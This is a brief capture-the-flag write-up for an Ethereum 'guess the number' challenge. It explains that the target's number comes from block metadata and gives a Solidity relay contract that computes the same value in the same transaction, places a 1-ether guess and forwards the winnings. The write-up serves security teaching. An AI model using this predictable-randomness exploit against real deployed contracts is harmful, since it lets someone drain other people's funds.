# Guess the new number

As in previous challenge we should guess result of hashing block metadata. Unlike previous challenge here we use previous block.

So transaction where we calculate answer should be mined in the same block, then they will have same block metadata.

To achieve it  we could call **guess** method from relay contract, where we already calculate answer for current block.
```solidity
function solve(address contractToSolve) public payable {
    GuessTheNewNumberChallenge c = GuessTheNewNumberChallenge(contractToSolve);
    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    c.guess.value(1 ether)(answer);
    msg.sender.transfer(address(this).balance);
}
```